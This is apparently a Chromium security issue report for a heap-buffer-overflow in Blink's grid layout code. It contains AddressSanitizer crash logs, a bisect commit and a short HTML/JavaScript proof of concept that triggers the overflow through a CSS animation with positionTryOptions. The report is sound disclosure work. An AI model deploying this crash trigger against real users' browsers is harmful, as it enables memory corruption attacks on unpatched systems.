#12 0x560095d1fdd4 in blink::GridLayoutAlgorithm::BuildGridSizingSubtree(blink::GridSizingTree\*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, blink::SubgriddedItemData const&, blink::GridLineResolver const*, bool, bool) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_layout\_algorithm.cc:543:14
#13 0x560095d15ca5 in blink::GridLayoutAlgorithm::BuildGridSizingTree(blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*) const ./../../third\_party/blink/renderer/core/layout/grid/grid\_layout\_algorithm.cc:696:5
#14 0x560095d1eb0d in blink::GridLayoutAlgorithm::ComputeMinMaxSizes(blink::MinMaxSizesFloatInput const&) ./../../third\_party/blink/renderer/core/layout/grid/grid\_layout\_algorithm.cc:380:33
#15 0x560095c0048f in operator()[blink::GridLayoutAlgorithm](javascript:void(0);) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:221:25
#16 0x560095c0048f in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::GridLayoutAlgorithm, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T\*) const&) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:118:3
#17 0x560095bea596 in ComputeMinMaxSizesWithAlgorithm ./../../third\_party/blink/renderer/core/layout/block\_node.cc:219:3
#18 0x560095bea596 in blink::BlockNode::ComputeMinMaxSizes(blink::WritingMode, blink::MinMaxSizesType, blink::ConstraintSpace const&, blink::MinMaxSizesFloatInput) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:972:30
#19 0x560096044d2c in operator() ./../../third\_party/abseil-cpp/absl/functional/function\_ref.h:132:12
#20 0x560096044d2c in operator() ./../../base/functional/function\_ref.h:124:12
#21 0x560096044d2c in blink::ResolveInlineLengthInternal(blink::ConstraintSpace const&, blink::ComputedStyle const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, blink::Length const&, blink::Length const\*, blink::LayoutUnit, blink::LayoutUnit) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:87:11
#22 0x56009604a4a0 in ResolveMainInlineLength ./../../third\_party/blink/renderer/core/layout/length\_utils.h:131:10
#23 0x56009604a4a0 in blink::ComputeInlineSizeForFragmentInternal(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:479:14
#24 0x56009604b3a8 in blink::ComputeInlineSizeForFragment(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:507:10
#25 0x560096054cf9 in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const\*, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, bool) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:1460:22
#26 0x56009605590b in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const\*, bool) ./../../third\_party/blink/renderer/core/layout/length\_utils.cc:1501:10
#27 0x560095be056e in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:395:9
#28 0x560095bf3e92 in blink::BlockNode::LayoutAtomicInline(blink::ConstraintSpace const&, blink::ComputedStyle const&, bool, blink::BaselineAlgorithmType) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:1536:32
#29 0x560095de9e3f in blink::LineBreaker::HandleAtomicInline(blink::InlineItem const&, blink::LineInfo\*) ./../../third\_party/blink/renderer/core/layout/inline/line\_breaker.cc:3000:14
#30 0x560095de0e4f in blink::LineBreaker::BreakLine(blink::LineInfo\*) ./../../third\_party/blink/renderer/core/layout/inline/line\_breaker.cc:0:7
#31 0x560095ddcfb0 in blink::LineBreaker::NextLine(blink::LineInfo\*) ./../../third\_party/blink/renderer/core/layout/inline/line\_breaker.cc:840:3
#32 0x560095b4f075 in blink::InlineLayoutAlgorithm::Layout() ./../../third\_party/blink/renderer/core/layout/inline/inline\_layout\_algorithm.cc:1129:20
#33 0x560095af0080 in blink::InlineNode::Layout(blink::ConstraintSpace const&, blink::BreakToken const\*, blink::ColumnSpannerPath const\*, blink::InlineChildLayoutContext\*) const ./../../third\_party/blink/renderer/core/layout/inline/inline\_node.cc:1658:20
#34 0x560095cf5ee8 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*, blink::LayoutInputNode\*, blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:125:25
#35 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const\*, blink::PreviousInflowPosition\*, blink::InlineChildLayoutContext\*, blink::InlineBreakToken const\*\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:1998:7
#36 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext\*) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:878:18
#37 0x560095cdd71d in blink::BlockLayoutAlgorithm::LayoutWithSimpleInlineChildLayoutContext(blink::InlineNode const&) ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:566:32
#38 0x560095cd789c in blink::BlockLayoutAlgorithm::Layout() ./../../third\_party/blink/renderer/core/layout/block\_layout\_algorithm.cc:499:14
#39 0x560095bf7ffa in operator()[blink::BlockLayoutAlgorithm](javascript:void(0);) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:210:50
#40 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T\*) const&) ./../../third\_party/blink/renderer/core/layout/block\_node.cc:118:3
#41 0x560095be1143 in LayoutWithAlgorithm ./../../third\_party/blink/renderer/core/layout/block\_node.cc:208:3
#42 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const\*, blink::EarlyBreak const\*, blink::ColumnSpannerPath const\*) const ./../../third\_party/blink/renderer/core/layout/block\_node.cc:465:21

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/sunburst/projects/fuzzframe/gen/browser/chromium/asan-linux-release-1294836/chrome+0xea6b57a) (BuildId: 5f8cdd7791bb830a)
Shadow bytes around the buggy address:
0x50300008e000: 00 00 00 00 f7 fa fd fd fd fa f7 fa fd fd fd fd
0x50300008e080: f7 fa 00 00 00 fa f7 fa fd fd fd fa f7 fa fd fd
0x50300008e100: fd fa f7 fa fd fd fd fd f7 fa fd fd fd fa f7 fa
0x50300008e180: fd fd fd fa f7 fa fd fd fd fd f7 fa fd fd fd fd
0x50300008e200: f7 fa fd fd fd fa f7 fa 00 00 00 00 f7 fa 00 00
=>0x50300008e280: 00 00 f7 fa fd fd fd fd f7 fa 00 00 00[fa]f7 fa
0x50300008e300: fd fd fd fd f7 fa fd fd fd fd f7 fa fd fd fd fd
0x50300008e380: f7 fa fd fd fd fa f7 fa fd fd fd fd f7 fa fd fd
0x50300008e400: fd fd f7 fa fd fd fd fa f7 fa fd fd fd fa f7 fa
0x50300008e480: fd fd fd fd f7 fa fd fd fd fd f7 fa fd fd fd fa
0x50300008e500: f7 fa fd fd fd fd f7 fa fd fd fd fd f7 fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable: 00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone: fa
Freed heap region: fd
Stack left redzone: f1
Stack mid redzone: f2
Stack right redzone: f3
Stack after return: f5
Stack use after scope: f8
Global redzone: f9
Global init order: f6
Poisoned by user: f7
Container overflow: fc
Array cookie: ac
Intra object redzone: bb
ASan internal: fe
Left alloca redzone: ca
Right alloca redzone: cb

==1==ADDITIONAL INFO

==1==Note: Please include this section with the ASan report.
Task trace:
#0 0x56008d229a07 in cc::ProxyImpl::ScheduledActionSendBeginMainFrame(viz::BeginFrameArgs const&) ./../../cc/trees/proxy\_impl.cc:731:7
#1 0x5600899be967 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) ./../../mojo/public/cpp/system/simple\_watcher.cc:102:13

==1==END OF ADDITIONAL INFO
==1==ABORTING

#### Reporter credit:

Huang Xilin of Ant Group Light-Year Security Lab

# Additional Data

Category: Security   

Chrome Channel: Dev   

Regression: N/A

## Timeline

### su...@gmail.com (2024-05-10)

## Additional Information

### Bisect

ebe0794a5b873b2102ed00658dfab31e5110fbeb

### POC

```
<html>
<body>
    <div>
        <div style="display: inline-grid;">
            <div></div>
            <div id="victim" style="height: 100vh;"> </div>
        </div>
    </div>
    <script>
        victim.animate([{
            position: "absolute",
            positionTryOptions: "flip-block",
        }], {
            duration: 36.0,
        })
        setTimeout(_=>location.reload(), 500);
    </script>
</body>
</html>

```
### Crash log

```
=================================================================
==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50300008e2e8 at pc 0x560075f4c57b bp 0x7fff77509670 sp 0x7fff77508e30
READ of size 24 at 0x50300008e2e8 thread T0 (chrome)
==1==WARNING: invalid path to external symbolizer!
==1==WARNING: Failed to use and restart external symbolizer!
    #0 0x560075f4c57a in __asan_memcpy _asan_rtl_:3
    #1 0x560095d78a73 in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, blink::ComputedStyle const&, blink::ComputedStyle const&, bool, bool, bool*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third_party/blink/renderer/core/layout/grid/grid_node.cc:118:33
    #2 0x560095d7787c in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, bool*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third_party/blink/renderer/core/layout/grid/grid_node.cc:18:10
    #3 0x560095d1fdd4 in blink::GridLayoutAlgorithm::BuildGridSizingSubtree(blink::GridSizingTree*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, blink::SubgriddedItemData const&, blink::GridLineResolver const*, bool, bool) const ./../../third_party/blink/renderer/core/layout/grid/grid_layout_algorithm.cc:543:14
    #4 0x560095d15ca5 in blink::GridLayoutAlgorithm::BuildGridSizingTree(blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*) const ./../../third_party/blink/renderer/core/layout/grid/grid_layout_algorithm.cc:696:5
    #5 0x560095d1eb0d in blink::GridLayoutAlgorithm::ComputeMinMaxSizes(blink::MinMaxSizesFloatInput const&) ./../../third_party/blink/renderer/core/layout/grid/grid_layout_algorithm.cc:380:33
    #6 0x560095c0048f in operator()<blink::GridLayoutAlgorithm> ./../../third_party/blink/renderer/core/layout/block_node.cc:221:25
    #7 0x560095c0048f in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::GridLayoutAlgorithm, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T*) const&) ./../../third_party/blink/renderer/core/layout/block_node.cc:118:3
    #8 0x560095bea596 in ComputeMinMaxSizesWithAlgorithm ./../../third_party/blink/renderer/core/layout/block_node.cc:219:3
    #9 0x560095bea596 in blink::BlockNode::ComputeMinMaxSizes(blink::WritingMode, blink::MinMaxSizesType, blink::ConstraintSpace const&, blink::MinMaxSizesFloatInput) const ./../../third_party/blink/renderer/core/layout/block_node.cc:972:30
    #10 0x560096044d2c in operator() ./../../third_party/abseil-cpp/absl/functional/function_ref.h:132:12
    #11 0x560096044d2c in operator() ./../../base/functional/function_ref.h:124:12
    #12 0x560096044d2c in blink::ResolveInlineLengthInternal(blink::ConstraintSpace const&, blink::ComputedStyle const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, blink::Length const&, blink::Length const*, blink::LayoutUnit, blink::LayoutUnit) ./../../third_party/blink/renderer/core/layout/length_utils.cc:87:11
    #13 0x56009604a4a0 in ResolveMainInlineLength ./../../third_party/blink/renderer/core/layout/length_utils.h:131:10
    #14 0x56009604a4a0 in blink::ComputeInlineSizeForFragmentInternal(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third_party/blink/renderer/core/layout/length_utils.cc:479:14
    #15 0x56009604b3a8 in blink::ComputeInlineSizeForFragment(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third_party/blink/renderer/core/layout/length_utils.cc:507:10
    #16 0x560096054cf9 in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const*, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, bool) ./../../third_party/blink/renderer/core/layout/length_utils.cc:1460:22
    #17 0x56009605590b in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const*, bool) ./../../third_party/blink/renderer/core/layout/length_utils.cc:1501:10
    #18 0x560095be056e in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*) const ./../../third_party/blink/renderer/core/layout/block_node.cc:395:9
    #19 0x560095bf3e92 in blink::BlockNode::LayoutAtomicInline(blink::ConstraintSpace const&, blink::ComputedStyle const&, bool, blink::BaselineAlgorithmType) ./../../third_party/blink/renderer/core/layout/block_node.cc:1536:32
    #20 0x560095de9e3f in blink::LineBreaker::HandleAtomicInline(blink::InlineItem const&, blink::LineInfo*) ./../../third_party/blink/renderer/core/layout/inline/line_breaker.cc:3000:14
    #21 0x560095de0e4f in blink::LineBreaker::BreakLine(blink::LineInfo*) ./../../third_party/blink/renderer/core/layout/inline/line_breaker.cc:0:7
    #22 0x560095ddcfb0 in blink::LineBreaker::NextLine(blink::LineInfo*) ./../../third_party/blink/renderer/core/layout/inline/line_breaker.cc:840:3
    #23 0x560095b4f075 in blink::InlineLayoutAlgorithm::Layout() ./../../third_party/blink/renderer/core/layout/inline/inline_layout_algorithm.cc:1129:20
    #24 0x560095af0080 in blink::InlineNode::Layout(blink::ConstraintSpace const&, blink::BreakToken const*, blink::ColumnSpannerPath const*, blink::InlineChildLayoutContext*) const ./../../third_party/blink/renderer/core/layout/inline/inline_node.cc:1658:20
    #25 0x560095cf5ee8 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*, blink::LayoutInputNode*, blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:125:25
    #26 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const*, blink::PreviousInflowPosition*, blink::InlineChildLayoutContext*, blink::InlineBreakToken const**) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:1998:7
    #27 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:878:18
    #28 0x560095cdd71d in blink::BlockLayoutAlgorithm::LayoutWithSimpleInlineChildLayoutContext(blink::InlineNode const&) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:566:32
    #29 0x560095cd789c in blink::BlockLayoutAlgorithm::Layout() ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:499:14
    #30 0x560095bf7ffa in operator()<blink::BlockLayoutAlgorithm> ./../../third_party/blink/renderer/core/layout/block_node.cc:210:50
    #31 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*) const&) ./../../third_party/blink/renderer/core/layout/block_node.cc:118:3
    #32 0x560095be1143 in LayoutWithAlgorithm ./../../third_party/blink/renderer/core/layout/block_node.cc:208:3
    #33 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*) const ./../../third_party/blink/renderer/core/layout/block_node.cc:465:21
    #34 0x560095cf5f84 in LayoutBlockChild ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:113:16
    #35 0x560095cf5f84 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*, blink::LayoutInputNode*, blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:128:10
    #36 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const*, blink::PreviousInflowPosition*, blink::InlineChildLayoutContext*, blink::InlineBreakToken const**) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:1998:7
    #37 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:878:18
    #38 0x560095cd78ae in blink::BlockLayoutAlgorithm::Layout() ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:501:14
    #39 0x560095bf7ffa in operator()<blink::BlockLayoutAlgorithm> ./../../third_party/blink/renderer/core/layout/block_node.cc:210:50
    #40 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*) const&) ./../../third_party/blink/renderer/core/layout/block_node.cc:118:3
    #41 0x560095be1143 in LayoutWithAlgorithm ./../../third_party/blink/renderer/core/layout/block_node.cc:208:3
    #42 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*) const ./../../third_party/blink/renderer/core/layout/block_node.cc:465:21
    #43 0x560095cf5f84 in LayoutBlockChild ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:113:16
    #44 0x560095cf5f84 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*, blink::LayoutInputNode*, blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:128:10
    #45 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const*, blink::PreviousInflowPosition*, blink::InlineChildLayoutContext*, blink::InlineBreakToken const**) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:1998:7
    #46 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:878:18
    #47 0x560095cd78ae in blink::BlockLayoutAlgorithm::Layout() ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:501:14
    #48 0x560095bf7ffa in operator()<blink::BlockLayoutAlgorithm> ./../../third_party/blink/renderer/core/layout/block_node.cc:210:50
    #49 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*) const&) ./../../third_party/blink/renderer/core/layout/block_node.cc:118:3
    #50 0x560095be1143 in LayoutWithAlgorithm ./../../third_party/blink/renderer/core/layout/block_node.cc:208:3
    #51 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*) const ./../../third_party/blink/renderer/core/layout/block_node.cc:465:21
    #52 0x560095ce9d64 in LayoutBlockChild ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:113:16
    #53 0x560095ce9d64 in blink::BlockLayoutAlgorithm::LayoutNewFormattingContext(blink::LayoutInputNode, blink::BlockBreakToken const*, blink::InflowChildData const&, blink::BfcOffset, bool, blink::BfcOffset*, blink::BoxStrut*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:1812:41
    #54 0x560095ce7334 in blink::BlockLayoutAlgorithm::HandleNewFormattingContext(blink::LayoutInputNode, blink::BlockBreakToken const*, blink::PreviousInflowPosition*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:1604:39
    #55 0x560095cd9668 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:873:18
    #56 0x560095cd78ae in blink::BlockLayoutAlgorithm::Layout() ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:501:14
    #57 0x560095bf7ffa in operator()<blink::BlockLayoutAlgorithm> ./../../third_party/blink/renderer/core/layout/block_node.cc:210:50
    #58 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*) const&) ./../../third_party/blink/renderer/core/layout/block_node.cc:118:3
    #59 0x560095be1143 in LayoutWithAlgorithm ./../../third_party/blink/renderer/core/layout/block_node.cc:208:3
    #60 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*) const ./../../third_party/blink/renderer/core/layout/block_node.cc:465:21
    #61 0x560096036117 in blink::LayoutView::LayoutRoot() ./../../third_party/blink/renderer/core/layout/layout_view.cc:863:19
    #62 0x560094e4e3de in blink::LocalFrameView::PerformLayout() ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:782:24
    #63 0x560094e505c8 in blink::LocalFrameView::UpdateLayout() ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:841:3
    #64 0x560094e6d0a2 in blink::LocalFrameView::UpdateStyleAndLayoutInternal() ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:3166:7
    #65 0x560094e5934f in blink::LocalFrameView::UpdateStyleAndLayout() ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:3096:18
    #66 0x560094e669ee in blink::LocalFrameView::UpdateStyleAndLayoutIfNeededRecursive() ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:3019:3
    #67 0x560094e63fa9 in blink::LocalFrameView::RunStyleAndLayoutLifecyclePhases(blink::DocumentLifecycle::LifecycleState) ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:2475:3
    #68 0x560094e63330 in blink::LocalFrameView::UpdateLifecyclePhasesInternal(blink::DocumentLifecycle::LifecycleState) ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:2235:9
    #69 0x560094e6100a in blink::LocalFrameView::UpdateLifecyclePhases(blink::DocumentLifecycle::LifecycleState, blink::DocumentUpdateReason) ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:2167:3
    #70 0x560094e60779 in blink::LocalFrameView::UpdateAllLifecyclePhases(blink::DocumentUpdateReason) ./../../third_party/blink/renderer/core/frame/local_frame_view.cc:1903:54
    #71 0x5600966ab3ec in blink::PageAnimator::UpdateAllLifecyclePhases(blink::LocalFrame&, blink::DocumentUpdateReason) ./../../third_party/blink/renderer/core/page/page_animator.cc:397:9
    #72 0x560094fa3e26 in blink::WebFrameWidgetImpl::UpdateLifecycle(blink::WebLifecycleUpdate, blink::DocumentUpdateReason) ./../../third_party/blink/renderer/core/frame/web_frame_widget_impl.cc:1584:14
    #73 0x560097865e55 in UpdateVisualState ./../../third_party/blink/renderer/platform/widget/widget_base.cc:1017:12
    #74 0x560097865e55 in non-virtual thunk to blink::WidgetBase::UpdateVisualState() ./../../third_party/blink/renderer/platform/widget/widget_base.cc:0:0
    #75 0x56008cf5cdac in cc::LayerTreeHost::RequestMainFrameUpdate(bool) ./../../cc/trees/layer_tree_host.cc:376:12
    #76 0x56008d20f822 in cc::ProxyMain::BeginMainFrame(std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>) ./../../cc/trees/proxy_main.cc:283:21
    #77 0x56008d2338c9 in Invoke<void (cc::ProxyMain::*)(std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState> >), const base::WeakPtr<cc::ProxyMain> &, std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState> > > ./../../base/functional/bind_internal.h:738:12
    #78 0x56008d2338c9 in MakeItSo<void (cc::ProxyMain::*)(std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState> >), std::__Cr::tuple<base::WeakPtr<cc::ProxyMain>, std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState> > > > ./../../base/functional/bind_internal.h:954:5
    #79 0x56008d2338c9 in void base::internal::Invoker<base::internal::FunctorTraits<void (cc::ProxyMain::*&&)(std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>), base::WeakPtr<cc::ProxyMain>&&, std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>&&>, base::internal::BindState<true, true, false, void (cc::ProxyMain::*)(std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>), base::WeakPtr<cc::ProxyMain>, std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>>, void ()>::RunImpl<void (cc::ProxyMain::*)(std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>), std::__Cr::tuple<base::WeakPtr<cc::ProxyMain>, std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>>, 0ul, 1ul>(void (cc::ProxyMain::*&&)(std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>), std::__Cr::tuple<base::WeakPtr<cc::ProxyMain>, std::__Cr::unique_ptr<cc::BeginMainFrameAndCommitState, std::__Cr::default_delete<cc::BeginMainFrameAndCommitState>>>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>) ./../../base/functional/bind_internal.h:1067:14
    #80 0x56008824aaa4 in Run ./../../base/functional/callback.h:156:12
